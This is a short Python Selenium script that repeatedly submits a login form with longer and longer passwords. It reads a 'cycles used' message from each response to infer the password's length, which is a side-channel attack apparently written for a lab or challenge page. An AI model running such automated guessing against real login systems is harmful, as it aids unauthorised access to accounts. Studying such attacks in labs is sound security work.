# https://stackoverflow.com/questions/13166395/fill-input-of-type-text-and-press-submit-using-python
from selenium import webdriver
from selenium.webdriver.common.by import By
import time


def get_timing(username: str, webpage: str, max_tries: int) -> int:
    # Ensure you have the correct path to your ChromeDriver executable
    chrome_driver_path = 'C:\Program Files\Google\Chrome\Application\chrome.exe'

    # Set up the Chrome WebDriver
    driver = webdriver.Chrome()
    driver.get(webpage)

    password_guess = ""
    password_length = 0

    for i in range(1, max_tries):
        print("Testing length: " + str(i))
        password_guess += "a"

        driver.find_element(By.NAME, "username").clear()
        driver.find_element(By.NAME, "username").send_keys(username)
        driver.find_element(By.NAME, "password").clear()
        driver.find_element(By.NAME, "password").send_keys(password_guess)

        print("Trying password: " + password_guess)
        driver.find_element(By.CLASS_NAME, "btn-primary").click()
        time.sleep(.5)

        response_message_element = driver.find_element(By.ID, "responseMessage")
        response_message_text = response_message_element.text

        start = response_message_text.find("used ") + 5
        end = response_message_text.find(" cycles")
        cycles = response_message_text[start:end]
        print("Used " + cycles + " cycles.")

        print("\n")

        if cycles != "0":
            print("Password length found!")
            password_length = i
            break

    # Close the browser window
    driver.quit()

    return password_length
